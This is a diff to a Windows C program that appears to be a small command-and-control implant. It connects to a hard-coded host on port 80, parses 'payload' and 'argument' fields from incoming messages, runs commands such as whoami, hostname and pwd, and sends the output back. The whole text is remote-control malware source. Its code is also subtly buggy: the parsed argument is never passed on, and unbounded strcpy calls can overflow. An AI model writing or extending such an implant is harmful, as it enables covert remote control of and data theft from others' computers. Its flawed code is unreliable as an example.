@@ -5,10 +5,10 @@
 #include <errhandlingapi.h>
 #pragma comment(lib, "ws2_32.lib")
 
-#define IP "192.168.1.40"
+#define IP "192.168.1.33"
 #define PORT_HTTP 80
 
-char *executing(char *receive);
+char *executing(char *receive, char *arg);
 char *whoamiCommand();
 char *hostnameCommand();
 char *pwdCommand();
@@ -53,11 +53,36 @@ int main() {
         }
         printf("Receiving:\n\n%s\n\n", receive);
 
+        //copying original payload
+        char receive_copy[1024];
+        strcpy(receive_copy, receive);
+  
+        //parsing to extract payload
+        char *content_length = strstr(receive_copy, "{'payload':");
+        content_length += strlen("{'payload':");
+        char *command_start = strtok(content_length, "'");
+        char *command = strtok(command_start, "'");
+
+        //copying original payload
+        char receive_copy2[1024];
+        strcpy(receive_copy2, receive);
+
+        //parsing to extract argument
+        char *content_length_arg = strstr(receive_copy2, ",'argument':");
+        char *arg;
+        if (content_length_arg != NULL) {
+            content_length_arg += strlen(",'argument':");
+            char *arg_start = strtok(content_length_arg, "'");
+            arg = strtok(arg_start, "'");
+        }
+
         char response[1024];
-        char command[1024];
         char *task;
-        strcpy(command, receive);
-        task = executing(command);
+        if (content_length_arg == NULL)
+            task = executing(command, NULL);
+        else
+            task = executing(command, NULL);
+
         sprintf(response, "%s\r\n", task);
 
         //sending payload result
@@ -76,7 +101,7 @@ int main() {
     WSACleanup();
 }
 
-char *executing(char *receive) {
+char *executing(char *receive, char *arg) {
     char *task;
     if (strcmp(receive, "whoami") == 0)
         task = whoamiCommand();
